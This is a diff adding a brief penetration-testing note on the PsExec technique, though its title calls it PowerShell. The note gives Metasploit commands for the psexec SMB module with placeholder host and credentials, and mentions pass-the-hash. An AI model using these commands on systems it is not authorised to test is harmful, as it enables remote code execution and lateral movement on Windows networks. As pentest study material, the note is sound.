@@ -1,0 +1,21 @@
+== PowerShell Execution Service ==
+
+"smb cred info shell"
+
+* Connect to a ADMIN$ share with a valid credentials
+
+* Upload executable
+
+* Connect to Windows Service Control Manager via RPC to start the executable service
+
+
+	msf> use exploit/windows/smb/psexec
+	msf..> set RHOST <..>
+	msf..> set SMBUser <valid_user>
+	msf..> set SMBPass <valid_pass>
+	msf..> exploit
+
+Note: password hash can be used instead of a password for SMBPass argument. In that case 
+the "pass the hash" module would be activated and used.
+
+
